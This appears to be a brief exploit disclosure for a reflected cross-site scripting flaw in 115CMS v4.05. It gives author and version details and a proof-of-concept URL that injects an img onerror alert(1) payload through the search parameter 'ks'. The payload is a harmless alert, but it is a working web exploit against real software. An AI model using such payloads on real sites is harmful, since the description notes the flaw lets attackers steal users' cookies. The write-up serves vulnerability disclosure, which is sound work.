## Information

```c
Exploit Title:115CMS-v4.05-Cross Site Scripting(XSS)
Exploit date:25.05.2021
Exploit Author:Al1ex@Heptagram
Vendor Homepage:https://www.115cms.com/
Affect Version:v4.05
Description:There is an XSS vulnerability in 115CMS-v4.05. Attackers can steal users' cookies and other information by constructing malicious request packets
```

## How to Exploit

After inserting XSS code into the search bar, querying can successfully trigger malicious XSS code

```
http://192.168.174.1/index.php/soso.html?ks=1%3Cimg%20src=x%20onerror=alert(1);%3E
```

![exploit](img/1.png)

## Reference

https://www.115cms.com/

